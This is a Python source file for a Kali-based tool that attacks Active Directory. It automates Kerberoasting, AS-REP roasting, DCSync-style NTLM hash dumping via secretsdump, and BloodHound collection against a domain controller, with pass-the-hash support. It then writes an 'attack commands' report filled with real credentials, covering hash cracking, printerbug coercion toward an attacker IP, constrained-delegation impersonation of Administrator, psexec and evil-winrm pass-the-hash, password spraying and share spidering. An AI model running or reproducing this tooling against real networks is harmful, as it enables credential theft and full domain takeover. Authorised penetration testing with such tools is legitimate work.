"""
kali_main.py - Remote AD enumeration from Kali.
Backbone: impacket (always installed). Extras: ldapdomaindump, netexec, bloodhound-python.
"""

import os, sys, re, subprocess, getpass, socket, traceback
from datetime import datetime

sys.path.insert(0, os.path.dirname(__file__))
from core.parser import Finding

# ---------------------------------------------------------------------------
# Colors
# ---------------------------------------------------------------------------
class C:
    RED="\033[91m"; YELLOW="\033[93m"; GREEN="\033[92m"
    CYAN="\033[96m"; BOLD="\033[1m"; RESET="\033[0m"
    DIM="\033[2m";  MAGENTA="\033[95m"

def _ok(m):   print(f"  {C.GREEN}[+]{C.RESET} {m}")
def _info(m): print(f"  {C.CYAN}[*]{C.RESET} {m}")
def _warn(m): print(f"  {C.YELLOW}[!]{C.RESET} {m}")
def _err(m):  print(f"  {C.RED}[-]{C.RESET} {m}")
def _section(t):
    print(f"\n{C.BOLD}{C.MAGENTA}{'─'*60}{C.RESET}")
    print(f"{C.BOLD}{C.MAGENTA}  {t}{C.RESET}")
    print(f"{C.BOLD}{C.MAGENTA}{'─'*60}{C.RESET}\n")

BANNER = r"""
  _  __     _ _   __  __       _
 | |/ /    | (_) |  \/  |     (_)
 | ' / __ _| |_  | \  / | __ _ _ _ __
 |  < / _` | | | | |\/| |/ _` | | '_ \
 | . \ (_| | | | | |  | | (_| | | | | |
 |_|\_\__,_|_|_| |_|  |_|\__,_|_|_| |_|

     Remote AD Recon — Kali Edition
     For educational use only.
"""

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def _has(bin_name):
    return subprocess.run(["which", bin_name], capture_output=True).returncode == 0

def _install(cmd_str):
    """Run an install command, streaming output."""
    _info(f"Installing: {cmd_str}")
    r = subprocess.run(cmd_str, shell=True, text=True, errors="ignore")
    return r.returncode == 0

OPTIONAL_TOOLS = [
    {
        "bins":    ["ldapdomaindump"],
        "name":    "ldapdomaindump",
        "what":    "Full AD object dump (users, groups, computers, policy)",
        "install": "pip3 install ldapdomaindump --break-system-packages",
    },
    {
        "bins":    ["netexec"],
        "name":    "netexec",
        "what":    "SMB shares, password policy, spray, targeted LDAP queries",
        "install": "sudo apt install -y netexec",
    },
    {
        "bins":    ["bloodhound-python"],
        "name":    "bloodhound-python",
        "what":    "Full BloodHound data collection (ZIP for GUI)",
        "install": "pip3 install bloodhound --break-system-packages",
    },
    {
        "bins":    ["ldapsearch"],
        "name":    "ldapsearch",
        "what":    "Raw LDAP queries (delegation, GPOs, trusts, AdminSDHolder)",
        "install": "sudo apt install -y ldap-utils",
    },
]

def check_and_install_tools():
    _section("Dependency Check")

    missing = [t for t in OPTIONAL_TOOLS if not any(_has(b) for b in t["bins"])]

    if not missing:
        _ok("All optional tools are installed.")
        return

    print(f"  {C.YELLOW}The following optional tools are missing:{C.RESET}\n")
    for t in missing:
        print(f"    {C.RED}[x]{C.RESET}  {t['name']:<25} {C.DIM}{t['what']}{C.RESET}")

    print()
    ans = input(f"  {C.CYAN}>{C.RESET} Install missing tools now? [Y/n]: ").strip().lower()
    if ans in ("", "y", "yes"):
        for t in missing:
            ok = _install(t["install"])
            if ok:
                _ok(f"{t['name']} installed.")
            else:
                _warn(f"{t['name']} install failed — will skip during enumeration.")
    else:
        _warn("Skipping installs — missing tools will be skipped during enumeration.")

def _run(cmd, out_file=None, timeout=120, cwd=None):
    """Run a command. Print warning if binary missing. Return stdout+stderr string."""
    if not _has(cmd[0]):
        _warn(f"Skipping — '{cmd[0]}' not found")
        return ""
    _info(f"Running: {' '.join(str(x) for x in cmd)}")
    try:
        r = subprocess.run(cmd, capture_output=True, text=True,
                           timeout=timeout, errors="ignore", cwd=cwd)
        out = r.stdout + r.stderr
        if out.strip() and out_file:
            os.makedirs(os.path.dirname(out_file), exist_ok=True)
            with open(out_file, "w") as f:
                f.write(out)
        return out
    except subprocess.TimeoutExpired:
        _warn(f"Timed out after {timeout}s")
        return ""
    except Exception as e:
        _err(f"Failed: {e}")
        return ""

def _imp_auth(cfg):
    if cfg["ntlm"]:
        return [f"{cfg['domain']}/{cfg['user']}", "-hashes", cfg["ntlm"]]
    return [f"{cfg['domain']}/{cfg['user']}:{cfg['password']}"]

def _dn(domain):
    return ",".join(f"DC={p}" for p in domain.split("."))

# ---------------------------------------------------------------------------
# Setup wizard
# ---------------------------------------------------------------------------
def wizard():
    _section("Setup")
    dc_ip  = input(f"  {C.CYAN}>{C.RESET} DC IP: ").strip()
    domain = input(f"  {C.CYAN}>{C.RESET} Domain (e.g. corp.local): ").strip()
    user   = input(f"  {C.CYAN}>{C.RESET} Username: ").strip()

    print(f"\n  Auth type:")
    print(f"    {C.GREEN}[1]{C.RESET} Password  (default)")
    print(f"    {C.GREEN}[2]{C.RESET} NTLM hash (pass-the-hash)")
    choice = input(f"  {C.CYAN}>{C.RESET} Choice [1]: ").strip() or "1"

    password, ntlm = "", ""
    if choice == "2":
        ntlm = input(f"  {C.CYAN}>{C.RESET} NTLM hash (LM:NT or just NT): ").strip()
        if ":" not in ntlm:
            ntlm = f"aad3b435b51404eeaad3b435b51404ee:{ntlm}"
    else:
        password = getpass.getpass(f"  {C.CYAN}>{C.RESET} Password: ")

    out_dir = input(f"  {C.CYAN}>{C.RESET} Output directory [{C.DIM}./results{C.RESET}]: ").strip() or "./results"
    raw_dir     = os.path.join(out_dir, "raw")
    reports_dir = os.path.join(out_dir, "reports")
    for d in [raw_dir, reports_dir]:
        os.makedirs(d, exist_ok=True)

    # Resolve DC hostname for bloodhound-python
    dc_hostname = dc_ip
    try:
        h = socket.gethostbyaddr(dc_ip)[0]
        if "." in h:
            dc_hostname = h
            _ok(f"DC hostname resolved: {dc_hostname}")
    except Exception:
        dc_hostname = f"dc.{domain}"

    return {
        "dc_ip": dc_ip, "dc_hostname": dc_hostname,
        "domain": domain, "user": user,
        "password": password, "ntlm": ntlm,
        "out_dir": out_dir, "raw_dir": raw_dir, "reports_dir": reports_dir,
    }

# ---------------------------------------------------------------------------
# Enumeration — impacket backbone
# ---------------------------------------------------------------------------
def run_enum(cfg):
    raw  = cfg["raw_dir"]
    data = {}

    # ── Users ────────────────────────────────────────────────────────────────
    _info("Enumerating domain users...")
    out = _run(["impacket-GetADUsers"] + _imp_auth(cfg) + ["-dc-ip", cfg["dc_ip"], "-all"],
               os.path.join(raw, "users.txt"))
    if out and "Name" in out:
        data["users"] = out
        _ok(f"Got domain users")
    else:
        _warn("impacket-GetADUsers returned no data")

    # ── Kerberoastable ───────────────────────────────────────────────────────
    _info("Kerberoasting...")
    out = _run(["impacket-GetUserSPNs"] + _imp_auth(cfg) +
               ["-dc-ip", cfg["dc_ip"], "-request",
                "-outputfile", os.path.join(raw, "kerberoast_hashes.txt")],
               os.path.join(raw, "kerberoast.txt"))
    if out:
        data["kerberoast"] = out
        if "$krb5tgs$" in out:
            _ok("Got kerberoastable hashes!")
        else:
            _ok("Kerberoast query completed (no hashes = no kerberoastable accounts)")

    # ── AS-REP Roasting ──────────────────────────────────────────────────────
    _info("AS-REP Roasting (no-preauth accounts)...")
    out = _run(["impacket-GetNPUsers", f"{cfg['domain']}/",
                "-dc-ip", cfg["dc_ip"], "-request", "-no-pass",
                "-format", "hashcat",
                "-outputfile", os.path.join(raw, "asrep_hashes.txt")],
               os.path.join(raw, "asrep.txt"))
    if out:
        data["asrep"] = out
        if "$krb5asrep$" in out:
            _ok("Got AS-REP hashes!")
        else:
            _ok("AS-REP query completed (no vulnerable accounts found)")

    # ── Delegation ───────────────────────────────────────────────────────────
    _info("Finding delegation...")
    out = _run(["impacket-findDelegation"] + _imp_auth(cfg) + ["-dc-ip", cfg["dc_ip"]],
               os.path.join(raw, "delegation.txt"))
    if out and ("Account" in out or "TRUSTED" in out.upper()):
        data["delegation"] = out
        _ok("Got delegation info")

    # ── Secretsdump (needs DA) ────────────────────────────────────────────────
    _info("Attempting secretsdump (works only if you have admin/DA)...")
    out = _run(["impacket-secretsdump"] + _imp_auth(cfg) +
               [f"@{cfg['dc_ip']}", "-just-dc-ntlm"],
               os.path.join(raw, "secretsdump.txt"), timeout=120)
    if out and re.search(r"\w+:\d+:[a-fA-F0-9]{32}", out):
        data["secretsdump"] = out
        count = len(re.findall(r"\w+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}", out))
        _ok(f"Got {count} NTLM hashes via secretsdump!")

    # ── ldapdomaindump (optional but rich) ───────────────────────────────────
    ldd_bin = next((b for b in ["ldapdomaindump","ldap-domaindump"] if _has(b)), None)
    if ldd_bin:
        _info("ldapdomaindump — full AD object dump...")
        dump_dir = os.path.join(raw, "ldapdomaindump")
        os.makedirs(dump_dir, exist_ok=True)
        if cfg["ntlm"]:
            ldd_auth = ["-u", f"{cfg['domain']}\\{cfg['user']}", "--hashes", cfg["ntlm"]]
        else:
            ldd_auth = ["-u", f"{cfg['domain']}\\{cfg['user']}", "-p", cfg["password"]]
        r = subprocess.run([ldd_bin] + ldd_auth + [cfg["dc_ip"], "-o", dump_dir],
                           capture_output=True, text=True, timeout=120, errors="ignore")
        ldd_out = r.stdout + r.stderr
        if "Could not bind" in ldd_out or "invalidCredentials" in ldd_out:
            _warn("ldapdomaindump: authentication failed")
        else:
            ldap_text = ""
            for fname, sname in [
                ("domain_users.grep",       "DOMAIN USERS"),
                ("domain_groups.grep",      "DOMAIN GROUPS"),
                ("domain_computers.grep",   "DOMAIN COMPUTERS"),
                ("domain_policy.grep",      "PASSWORD POLICY"),
                ("domain_trusts.grep",      "DOMAIN TRUSTS"),
                ("domain_controllers.grep", "DOMAIN CONTROLLERS"),
            ]:
                fpath = os.path.join(dump_dir, fname)
                if os.path.exists(fpath):
                    content = open(fpath).read().strip()
                    if content:
                        ldap_text += f"\n=== {sname} ===\n{content}\n"
                        _ok(f"Got {sname}")
            if ldap_text:
                data["ldap_enum"] = ldap_text
                with open(os.path.join(raw, "ldap_enum.txt"), "w") as f:
                    f.write(ldap_text)
    else:
        _warn("ldapdomaindump not found — skipping full AD dump (pip3 install ldapdomaindump)")

    # ── ldapsearch targeted queries (optional) ────────────────────────────────
    if _has("ldapsearch"):
        _info("ldapsearch — delegation, GPOs, trusts, protected accounts...")
        ldap_extra = ""
        for sname, filt in [
            ("CONSTRAINED DELEGATION", "(msDS-AllowedToDelegateTo=*)"),
            ("GPO LIST",               "(objectClass=groupPolicyContainer)"),
            ("DOMAIN TRUSTS",          "(objectClass=trustedDomain)"),
            ("ADMINSDEHOLDER USERS",   "(&(objectCategory=person)(objectClass=user)(adminCount=1))"),
            ("PASSWD NOTREQD USERS",   "(&(objectclass=user)(userAccountControl:1.2.840.113549.1.1.11:=544))"),
        ]:
            r = subprocess.run(
                ["ldapsearch", "-x", "-H", f"ldap://{cfg['dc_ip']}",
                 "-D", f"{cfg['user']}@{cfg['domain']}",
                 "-w", cfg["password"] or "",
                 "-b", _dn(cfg["domain"]), filt,
                 "sAMAccountName", "msDS-AllowedToDelegateTo", "displayName",
                 "trustPartner", "gPCFileSysPath"],
                capture_output=True, text=True, timeout=30, errors="ignore"
            )
            out = r.stdout.strip()
            if out and "numEntries" in r.stderr or (out and "dn:" in out):
                ldap_extra += f"\n=== {sname} ===\n{out}\n"
                _ok(f"Got {sname}")
        if ldap_extra:
            data["ldap_extra"] = ldap_extra
            existing = data.get("ldap_enum", "")
            data["ldap_enum"] = existing + ldap_extra
            with open(os.path.join(raw, "ldap_enum.txt"), "a") as f:
                f.write(ldap_extra)

    # ── netexec (optional) ────────────────────────────────────────────────────
    if _has("netexec"):
        _info("netexec — SMB shares + password policy...")
        def nxc(proto, *flags):
            base = ["netexec", proto, cfg["dc_ip"], "-u", cfg["user"]]
            base += ["-H", cfg["ntlm"].split(":")[-1]] if cfg["ntlm"] else ["-p", cfg["password"]]
            return _run(base + list(flags), os.path.join(raw, f"nxc_{proto}_{'_'.join(str(f).lstrip('-') for f in flags[:1])}.txt"), timeout=30)

        out = nxc("smb", "--shares");   data["shares"]  = out if out else ""
        out = nxc("smb", "--pass-pol"); data["passpol"] = out if out else ""
        out = nxc("ldap", "--users");   data["nxc_users"] = out if out else ""
        # Kerberoasting + AS-REP via netexec too (writes hash files directly)
        nxc("ldap", "--kerberoasting", os.path.join(raw, "kerberoast_hashes_nxc.txt"))
        nxc("ldap", "--asreproast",    os.path.join(raw, "asrep_hashes_nxc.txt"))
        nxc("ldap", "--trusted-for-delegation")
        nxc("ldap", "--admin-count")
        nxc("ldap", "--password-not-required")
    else:
        _warn("netexec not installed — skipping SMB/LDAP queries (sudo apt install netexec)")

    # ── bloodhound-python (optional) ──────────────────────────────────────────
    if _has("bloodhound-python"):
        _info("bloodhound-python — full collection for BloodHound GUI...")
        cmd = ["bloodhound-python", "-d", cfg["domain"], "-u", cfg["user"],
               "-ns", cfg["dc_ip"], "-dc", cfg["dc_hostname"], "-c", "All", "--zip"]
        cmd += ["--hashes", cfg["ntlm"]] if cfg["ntlm"] else ["-p", cfg["password"]]
        r = subprocess.run(cmd, capture_output=True, text=True,
                           timeout=300, errors="ignore", cwd=cfg["raw_dir"])
        bh_out = r.stdout + r.stderr
        with open(os.path.join(raw, "bloodhound.log"), "w") as f:
            f.write(bh_out)
        zips = [f for f in os.listdir(raw) if f.endswith(".zip")]
        if zips:
            _ok(f"BloodHound ZIP: {os.path.join(raw, zips[0])}")
        else:
            _warn("bloodhound-python ran but no ZIP produced — check raw/bloodhound.log")
    else:
        _warn("bloodhound-python not installed — skipping (pip3 install bloodhound)")

    return data

# ---------------------------------------------------------------------------
# Parser
# ---------------------------------------------------------------------------
def parse_results(data):
    findings = []
    ldap   = data.get("ldap_enum", "")
    kerb   = data.get("kerberoast", "") + open(data.get("_kerb_hashes","") or "/dev/null", errors="ignore").read() if False else data.get("kerberoast","")
    asrep  = data.get("asrep", "")
    deleg  = data.get("delegation", "")
    secrets= data.get("secretsdump", "")
    shares = data.get("shares", "")
    passpol= data.get("passpol", "")

    def sec(text, header):
        m = re.search(rf"===\s*{re.escape(header)}\s*===\s*\n(.*?)(?====|\Z)", text, re.DOTALL|re.IGNORECASE)
        return m.group(1).strip() if m else ""

    # Kerberoastable
    kerb_users = list(dict.fromkeys(re.findall(r"\$krb5tgs\$\d+\$\*(\w+)\b", kerb)))
    if kerb_users:
        findings.append(Finding("kerberoastable_users",
            f"Kerberoastable Accounts ({len(kerb_users)} found)", "HIGH", "Kerberos",
            "Accounts with SPNs — request TGS and crack offline.", kerb_users, "impacket"))

    # AS-REP
    asrep_users = list(dict.fromkeys(re.findall(r"\$krb5asrep\$\d*\$(\w+)@", asrep)))
    if asrep_users:
        findings.append(Finding("asrep_roastable",
            f"AS-REP Roastable Accounts ({len(asrep_users)} found)", "HIGH", "Kerberos",
            "Pre-auth disabled — hash requestable without credentials.", asrep_users, "impacket"))

    # Unconstrained delegation (non-DC)
    unc = [l for l in deleg.splitlines() if "Unconstrained" in l and "Domain Controller" not in l]
    if unc:
        findings.append(Finding("unconstrained_delegation",
            "Unconstrained Delegation (Non-DC)", "CRITICAL", "Delegation",
            "Coerce DC auth → capture TGT → DCSync.", unc, "impacket"))

    # Constrained delegation
    const = [l for l in deleg.splitlines() if "Constrained" in l or "msDS-AllowedToDelegate" in l]
    const += re.findall(r"sAMAccountName\s*:\s*(\S+)", sec(ldap, "CONSTRAINED DELEGATION"))
    const = list(dict.fromkeys(const))
    if const:
        findings.append(Finding("constrained_delegation",
            f"Constrained Delegation ({len(const)} accounts)", "HIGH", "Delegation",
            "S4U2Proxy abuse — impersonate any user to the delegated service.", const, "impacket"))

    # NTLM hashes
    hashes = list(dict.fromkeys(re.findall(r"\w+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}", secrets)))
    if hashes:
        findings.append(Finding("hashes_found",
            f"NTLM Hashes Dumped ({len(hashes)} accounts)", "CRITICAL", "CredentialAccess",
            "Full hash dump — crack offline or pass-the-hash.", hashes[:20], "secretsdump"))

    # No lockout
    if re.search(r"Lockout Threshold\s*[=:]\s*0|lockoutThreshold.*?:\s*0", passpol+ldap, re.IGNORECASE):
        findings.append(Finding("no_lockout",
            "No Account Lockout Policy", "HIGH", "PasswordPolicy",
            "No lockout — password spray freely.", ["Lockout Threshold: 0"], "netexec"))

    # SMB shares
    readable = list(dict.fromkeys(re.findall(r"([\w\-]+)\s+READ", shares, re.IGNORECASE)))
    if readable:
        findings.append(Finding("smb_shares",
            f"Readable SMB Shares ({len(readable)} found)", "MEDIUM", "Enumeration",
            "Check SYSVOL/NETLOGON for GPP passwords. Spider other shares for creds.", readable, "netexec"))

    # Password not required
    no_pw = list(dict.fromkeys(re.findall(r"sAMAccountName\s*:\s*(\S+)", sec(ldap, "PASSWD NOTREQD USERS"))))
    if no_pw:
        findings.append(Finding("password_not_required",
            f"Password Not Required ({len(no_pw)} accounts)", "HIGH", "PasswordPolicy",
            "PASSWD_NOTREQD flag — accounts may have empty passwords.", no_pw, "ldapsearch"))

    # Domain trusts
    trusts = list(dict.fromkeys(re.findall(r"trustPartner\s*:\s*(\S+)", sec(ldap, "DOMAIN TRUSTS"))))
    if trusts:
        findings.append(Finding("domain_trusts",
            f"Domain Trusts Found ({len(trusts)})", "MEDIUM", "Enumeration",
            "Trust relationships may enable cross-domain attacks.", trusts, "ldapsearch"))

    findings.sort(key=lambda f: {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}.get(f.severity, 9))
    return findings

# ---------------------------------------------------------------------------
# Loot collector
# ---------------------------------------------------------------------------
def collect_loot(data, cfg):
    ldap    = data.get("ldap_enum", "")
    kerb    = data.get("kerberoast", "")
    asrep   = data.get("asrep", "")
    secrets = data.get("secretsdump", "")
    deleg   = data.get("delegation", "")
    passpol = data.get("passpol", "")
    users_raw = data.get("users", "")

    def sec(text, header):
        m = re.search(rf"===\s*{re.escape(header)}\s*===\s*\n(.*?)(?====|\Z)", text, re.DOTALL|re.IGNORECASE)
        return m.group(1).strip() if m else ""

    def uniq(lst):
        return list(dict.fromkeys(x for x in lst if x and len(x) > 1))

    # Domain users — from impacket-GetADUsers output or ldapdomaindump
    users = uniq(re.findall(r"^(\w[\w\.\-]+)\s+\S+\s+\S", users_raw, re.MULTILINE))
    if not users:
        users = uniq(re.findall(r"sAMAccountName\s*:\s*(\S+)", sec(ldap, "DOMAIN USERS")))

    # DAs
    admins = uniq(re.findall(r"sAMAccountName\s*:\s*(\S+)", sec(ldap, "DOMAIN ADMINS")))

    # DCs
    dcs = uniq(re.findall(r"dNSHostName\s*:\s*(\S+)", sec(ldap, "DOMAIN CONTROLLERS")))

    # Computers
    comps = uniq(re.findall(r"sAMAccountName\s*:\s*(\S+\$)", sec(ldap, "DOMAIN COMPUTERS")) +
                 re.findall(r"dNSHostName\s*:\s*(\S+)", sec(ldap, "DOMAIN COMPUTERS")))

    # SPNs
    spns = uniq(re.findall(r"ServicePrincipalName\s*:\s*(\S+)", kerb+ldap))

    # Hashes
    hashes = uniq(re.findall(r"\w+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}", secrets))[:20]

    # Password policy
    pol = uniq(re.findall(
        r"((?:minPwdLength|lockoutThreshold|MaximumPasswordAge|MinimumPasswordLength|LockoutBadCount)[^\n=:]*[=:]\s*\S+)",
        ldap+passpol, re.IGNORECASE))

    # Trusts
    trusts = uniq(re.findall(r"trustPartner\s*:\s*(\S+)", sec(ldap, "DOMAIN TRUSTS")))

    # GPOs
    gpos = uniq(re.findall(r"displayName\s*:\s*(.+)", sec(ldap, "GPO LIST")))

    # Constrained delegation
    const_deleg = uniq([l.strip() for l in deleg.splitlines() if "Constrained" in l])

    return {
        "domain_users":          users,
        "domain_admins":         admins,
        "domain_controllers":    dcs,
        "domain_computers":      comps,
        "kerberoastable":        uniq(re.findall(r"\$krb5tgs\$\d+\$\*(\w+)\b", kerb)),
        "asrep_roastable":       uniq(re.findall(r"\$krb5asrep\$\d*\$(\w+)@", asrep)),
        "spns":                  spns,
        "hashes_found":          hashes,
        "passwords_found":       [],
        "constrained_delegation":const_deleg,
        "password_policy":       pol,
        "domain_trusts":         trusts,
        "gpos":                  gpos,
        "interesting_files":     [],
    }

# ---------------------------------------------------------------------------
# Reports — plain text
# ---------------------------------------------------------------------------
SEV_ORDER = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}

ATTACK_COMMANDS = {
    "kerberoastable_users": [
        "# Request TGS hashes",
        "impacket-GetUserSPNs {domain}/{user}:{password} -dc-ip {dc_ip} -request -outputfile kerb_hashes.txt",
        "# Crack offline",
        "hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt",
    ],
    "asrep_roastable": [
        "# AS-REP (no creds needed)",
        "impacket-GetNPUsers {domain}/ -dc-ip {dc_ip} -request -no-pass -format hashcat -outputfile asrep_hashes.txt",
        "# Crack offline",
        "hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt",
    ],
    "unconstrained_delegation": [
        "# Monitor for TGTs on the compromised box",
        "Rubeus.exe monitor /interval:5 /nowrap",
        "# Coerce DC auth",
        "python3 printerbug.py {domain}/{user}:{password}@{dc_ip} <ATTACKER_IP>",
        "# DCSync after capturing TGT",
        "impacket-secretsdump {domain}/{user}@{dc_ip} -just-dc-ntlm",
    ],
    "constrained_delegation": [
        "# S4U2Proxy — impersonate DA to delegated service",
        "impacket-getST -spn <TARGET_SPN> -impersonate Administrator {domain}/{user}:{password} -dc-ip {dc_ip}",
        "export KRB5CCNAME=Administrator@<TARGET_SPN>.ccache",
        "impacket-psexec -k -no-pass {domain}/Administrator@<TARGET_HOST>",
    ],
    "hashes_found": [
        "# Pass-the-Hash",
        "netexec smb {dc_ip} -u <USER> -H <NT_HASH>",
        "impacket-psexec {domain}/<USER>@{dc_ip} -hashes :<NT_HASH>",
        "evil-winrm -i {dc_ip} -u <USER> -H <NT_HASH>",
        "# Crack offline",
        "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt",
    ],
    "no_lockout": [
        "# Password spray — no lockout risk",
        "netexec smb {dc_ip} -u users.txt -p <PASSWORD> --continue-on-success",
        "kerbrute passwordspray -d {domain} --dc {dc_ip} users.txt <PASSWORD>",
    ],
    "smb_shares": [
        "# Hunt for GPP passwords in SYSVOL",
        "netexec smb {dc_ip} -u {user} -p {password} -M gpp_password",
        "# Spider shares",
        "netexec smb {dc_ip} -u {user} -p {password} -M spider_plus -o DOWNLOAD_FLAG=True",
        "smbclient //{dc_ip}/<SHARE> -U '{domain}\\{user}%{password}'",
    ],
    "password_not_required": [
        "# Try empty password",
        "netexec smb {dc_ip} -u <USER> -p ''",
        "evil-winrm -i {dc_ip} -u <USER> -p ''",
    ],
    "domain_trusts": [
        "# Enumerate trust info",
        "impacket-GetUserSPNs {domain}/{user}:{password} -dc-ip {dc_ip} -target-domain <TRUSTED_DOMAIN>",
        "bloodhound-python -d <TRUSTED_DOMAIN> -u {user}@{domain} -p {password} -ns {dc_ip} -c All --zip",
    ],
}

def _fill(cmd, cfg):
    return (cmd.replace("{domain}", cfg["domain"])
               .replace("{dc_ip}",  cfg["dc_ip"])
               .replace("{user}",   cfg["user"])
               .replace("{password}", cfg.get("password","<PASSWORD>")))

def build_reports(findings, loot, data, cfg):
    reports_dir = cfg["reports_dir"]
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    D = "="*70
    d = "-"*70

    # ── Report 1 ─────────────────────────────────────────────────────────────
    r1 = [D, "  AD RECON — REPORT 1: FINDINGS & INTELLIGENCE", D,
          f"  Generated : {ts}",
          f"  Domain    : {cfg['domain']}",
          f"  DC IP     : {cfg['dc_ip']}",
          f"  User      : {cfg['user']}",
          D, ""]

    r1 += ["FINDINGS SUMMARY", d]
    sev_counts = {}
    for f in findings:
        sev_counts[f.severity] = sev_counts.get(f.severity, 0) + 1
    if findings:
        for sev in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]:
            if sev in sev_counts:
                r1.append(f"  [{sev}]  {sev_counts[sev]} finding(s)")
    else:
        r1.append("  No findings detected (check credentials and tool output in raw/)")
    r1.append("")

    r1 += ["INTELLIGENCE LOOT", d]
    for label, key in [
        ("Domain Users",           "domain_users"),
        ("Domain Admins",          "domain_admins"),
        ("Domain Controllers",     "domain_controllers"),
        ("Domain Computers",       "domain_computers"),
        ("Kerberoastable Users",   "kerberoastable"),
        ("AS-REP Roastable",       "asrep_roastable"),
        ("SPNs",                   "spns"),
        ("NTLM Hashes",            "hashes_found"),
        ("Cleartext Passwords",    "passwords_found"),
        ("Constrained Delegation", "constrained_delegation"),
        ("Password Policy",        "password_policy"),
        ("Domain Trusts",          "domain_trusts"),
        ("GPOs",                   "gpos"),
        ("Interesting Files",      "interesting_files"),
    ]:
        items = loot.get(key, [])
        if items:
            r1.append(f"\n  {label} ({len(items)}):")
            for item in items[:30]:
                r1.append(f"    - {item}")
    r1.append("")

    r1 += ["FINDINGS DETAIL", d]
    for f in findings:
        r1 += ["", f"  [{f.severity}] {f.title}",
               f"  Category : {f.category}",
               f"  Tool     : {f.tool}",
               f"  Details  : {f.description}",
               "  Evidence :"]
        for ev in (f.evidence or [])[:15]:
            r1.append(f"    {ev}")
        r1.append("-"*50)

    p1 = os.path.join(reports_dir, "report1_findings.txt")
    with open(p1, "w") as fh:
        fh.write("\n".join(r1))

    # ── Report 2 ─────────────────────────────────────────────────────────────
    r2 = [D, "  AD RECON — REPORT 2: ATTACK COMMANDS", D,
          f"  Generated : {ts}",
          f"  Domain    : {cfg['domain']}",
          f"  DC IP     : {cfg['dc_ip']}",
          f"  User      : {cfg['user']}",
          D,
          "  Legend: real values already filled in | <PLACEHOLDER> = you fill this",
          D, ""]

    # BloodHound guide
    zips = [f for f in os.listdir(cfg["raw_dir"]) if f.endswith(".zip")]
    r2 += ["BLOODHOUND", d]
    if zips:
        r2 += [f"  ZIP: {os.path.join(cfg['raw_dir'], zips[0])}",
               "  1. Open BloodHound → Upload Data → select ZIP",
               "  2. Run: Shortest Paths to Domain Admins",
               "  3. Run: Kerberoastable Users, AS-REP Roastable Users",
               "  4. Run: Find Principals with DCSync Rights"]
    else:
        r2.append("  No BloodHound ZIP — run: pip3 install bloodhound && python3 kali_main.py")
    r2.append("")

    r2 += ["ATTACK PLAYBOOKS", d]
    matched = [f for f in findings if f.id in ATTACK_COMMANDS]
    if not matched:
        r2.append("  No matching attack templates for current findings.")
    for f in matched:
        r2 += ["", f"  [{f.severity}] {f.title}", "-"*50]
        for cmd in ATTACK_COMMANDS[f.id]:
            r2.append(f"    {_fill(cmd, cfg)}")

    p2 = os.path.join(reports_dir, "report2_attack_commands.txt")
    with open(p2, "w") as fh:
        fh.write("\n".join(r2))

    return p1, p2

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    print(C.RED + BANNER + C.RESET)
    check_and_install_tools()
    cfg = wizard()

    _section("PHASE 2 - Enumeration")
    data = run_enum(cfg)

    _section("PHASE 3 - Reports")
    findings = parse_results(data)
    _ok(f"Parsed {len(findings)} finding(s)")

    loot = collect_loot(data, cfg)
    filled = sum(1 for v in loot.values() if v)
    _ok(f"Loot table: {filled}/14 categories populated")

    r1, r2 = build_reports(findings, loot, data, cfg)

    _section("Done")
    _ok(f"Report 1 (Findings):        {r1}")
    _ok(f"Report 2 (Attack Commands): {r2}")
    _ok(f"Raw files:                  {cfg['raw_dir']}")
    zips = [f for f in os.listdir(cfg["raw_dir"]) if f.endswith(".zip")]
    if zips:
        _ok(f"BloodHound ZIP:             {os.path.join(cfg['raw_dir'], zips[0])}")
    print()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n  {C.YELLOW}[!] Interrupted.{C.RESET}\n")
    except Exception:
        traceback.print_exc()
